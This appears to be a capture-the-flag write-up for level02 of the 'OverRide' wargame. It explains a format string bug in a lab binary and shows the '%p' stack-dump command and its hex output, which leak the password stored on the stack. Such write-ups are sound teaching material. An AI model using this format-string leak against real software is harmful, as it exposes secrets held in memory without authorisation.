# level02

Inspecting the source code, it is clear that this is a format string vulnerability. We can dump the stack content with multiple `%p`, then making it easy to have access to the password that is stored on the stack. Our input will have a very easy recognizable pattern in the stack dump, so we can pin point where the password could be stored.

```bash
level02@OverRide:~$ (python -c 'print("%p"*49)'; sleep 0.1; echo "ABCDEFGH") | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4e0(nil)0x410x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6d80x1f7ff9a080x4847464544434241(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x29000070250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6d80x1000000000x400814(nil)0x599f0374e117fac3 does not have access!
```

The dump `(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)` is probably our target. With the help of a python script, we can make make this dump human readable by reordering the byte in a correct order (stack value are interpreted in little-endian format).